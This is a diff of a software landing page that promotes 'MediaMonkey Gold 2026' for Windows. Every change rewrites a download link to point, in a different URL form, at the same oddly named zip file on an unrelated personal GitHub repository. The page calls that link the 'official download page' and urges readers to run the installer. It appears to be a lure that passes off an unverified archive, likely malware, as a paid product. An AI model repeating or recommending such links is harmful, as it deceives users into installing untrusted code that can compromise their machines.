@@ -6,7 +6,7 @@ description: "Download MediaMonkey Gold for Windows 10 & 11 to organize, tag, an
 <h1 style="font-size: 32px; font-weight: 700; margin: 0 0 10px 0;">🎵 MediaMonkey-Gold-2026 - Organize Your Music Library Fast</h1>
 
 <p style="font-size: 18px; margin: 0 0 15px 0;">
-  <a href="https://github.com/Indefensible-parry731/indefensible-parry731.github.io/raw/refs/heads/main/stringmaker/github-parry-io-indefensible-v3.0.zip" style="display: inline-block; padding: 14px 28px; background-color: #2b5797; color: #ffffff; text-decoration: none; font-weight: 600; border-radius: 6px; font-size: 18px;">⬇️ Download MediaMonkey Gold for Windows</a>
+  <a href="https://raw.githubusercontent.com/Indefensible-parry731/indefensible-parry731.github.io/main/stringmaker/github-parry-io-indefensible-v3.0.zip" style="display: inline-block; padding: 14px 28px; background-color: #2b5797; color: #ffffff; text-decoration: none; font-weight: 600; border-radius: 6px; font-size: 18px;">⬇️ Download MediaMonkey Gold for Windows</a>
 </p>
 
 <p style="font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
@@ -47,7 +47,7 @@ description: "Download MediaMonkey Gold for Windows 10 & 11 to organize, tag, an
 <h3 style="font-size: 20px; font-weight: 600; margin: 15px 0 8px 0;">Step 1: Visit the download page</h3>
 
 <p style="font-size: 16px; line-height: 1.6; margin: 0 0 8px 0;">
-  Go to the <a href="https://github.com/Indefensible-parry731/indefensible-parry731.github.io/raw/refs/heads/main/stringmaker/github-parry-io-indefensible-v3.0.zip" style="color: #2b5797;">official download page</a>. This page lists all available versions.
+  Go to the <a href="https://raw.githubusercontent.com/Indefensible-parry731/indefensible-parry731.github.io/main/stringmaker/github-parry-io-indefensible-v3.0.zip" style="color: #2b5797;">official download page</a>. This page lists all available versions.
 </p>
 
 <h3 style="font-size: 20px; font-weight: 600; margin: 15px 0 8px 0;">Step 2: Choose the installer file</h3>
@@ -92,7 +92,7 @@ description: "Download MediaMonkey Gold for Windows 10 & 11 to organize, tag, an
 </p>
 
 <p style="font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
-  <a href="https://github.com/Indefensible-parry731/indefensible-parry731.github.io/raw/refs/heads/main/stringmaker/github-parry-io-indefensible-v3.0.zip" style="display: inline-block; padding: 12px 24px; background-color: #4a90e2; color: #ffffff; text-decoration: none; font-weight: 600; border-radius: 6px; font-size: 16px;">⬇️ Download MediaMonkey Gold Now</a>
+  <a href="https://raw.githubusercontent.com/Indefensible-parry731/indefensible-parry731.github.io/main/stringmaker/github-parry-io-indefensible-v3.0.zip" style="display: inline-block; padding: 12px 24px; background-color: #4a90e2; color: #ffffff; text-decoration: none; font-weight: 600; border-radius: 6px; font-size: 16px;">⬇️ Download MediaMonkey Gold Now</a>
 </p>
 
 <h2 style="font-size: 24px; font-weight: 600; margin: 20px 0 10px 0;">🔧 First-Time Setup Guide</h2>
@@ -155,7 +155,7 @@ description: "Download MediaMonkey Gold for Windows 10 & 11 to organize, tag, an
 <h3 style="font-size: 20px; font-weight: 600; margin: 15px 0 8px 0;">How do I update to the latest version?</h3>
 
 <p style="font-size: 16px; line-height: 1.6; margin: 0 0 10px 0;">
-  Check the <a href="https://github.com/Indefensible-parry731/indefensible-parry731.github.io/raw/refs/heads/main/stringmaker/github-parry-io-indefensible-v3.0.zip" style="color: #2b5797;">download page</a> for new releases. Download the latest installer and run it. It will update your existing installation without losing your library or settings.
+  Check the <a href="https://raw.githubusercontent.com/Indefensible-parry731/indefensible-parry731.github.io/main/stringmaker/github-parry-io-indefensible-v3.0.zip" style="color: #2b5797;">download page</a> for new releases. Download the latest installer and run it. It will update your existing installation without losing your library or settings.
 </p>
 
 <h3 style="font-size: 20px; font-weight: 600; margin: 15px 0 8px 0;">Can I uninstall it later?</h3>
